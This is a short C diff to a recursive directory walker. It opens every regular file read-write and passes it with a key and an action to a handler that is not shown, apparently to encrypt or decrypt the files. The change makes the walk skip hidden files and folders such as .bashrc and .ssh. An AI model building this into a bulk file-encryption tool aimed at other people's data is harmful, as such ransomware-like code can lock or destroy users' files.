@@ -31,20 +31,28 @@ int handle_folder(unsigned char *key, enum action action, int dirfd)
         switch (ep->d_type)
         {
             case DT_REG:
-                printf("F: %s\n", ep->d_name);
-                /* Open the current file. */
-                current_fd = openat(dirfd, ep->d_name, O_RDWR);
-                /* Apply the action to this file, the file descruptor will be closed by the underlying function. */
-                handle_file(key, action, current_fd);
+                /* Do not process hidden files (like .bashrc).*/
+                if (strncmp(ep->d_name, ".", 1) != 0)
+                {
+                    printf("F: %s\n", ep->d_name);
+                    /* Open the current file. */
+                    current_fd = openat(dirfd, ep->d_name, O_RDWR);
+                    /* Apply the action to this file, the file descruptor will be closed by the underlying function. */
+                    handle_file(key, action, current_fd);
+                }
                 break;
             case DT_DIR:
                 if ((strncmp(ep->d_name, "..", 3) != 0) && ((strncmp(ep->d_name, ".", 2) != 0)))
                 {
-                    printf("D: %s\n", ep->d_name);
-                    /* Open the current folder. */
-                    current_fd = openat(dirfd, ep->d_name, O_RDONLY | O_DIRECTORY);
-                    /* Apply the action to this folder, the descriptor will be closed by the underlying function. */
-                    handle_folder(key, action, current_fd);
+                    /* Do not process hidden folder (like .ssh). */
+                    if (strncmp(ep->d_name, ".", 1) != 0)
+                    {
+                        printf("D: %s\n", ep->d_name);
+                        /* Open the current folder. */
+                        current_fd = openat(dirfd, ep->d_name, O_RDONLY | O_DIRECTORY);
+                        /* Apply the action to this folder, the descriptor will be closed by the underlying function. */
+                        handle_folder(key, action, current_fd);
+                    }
                 }
                 break;
             default:
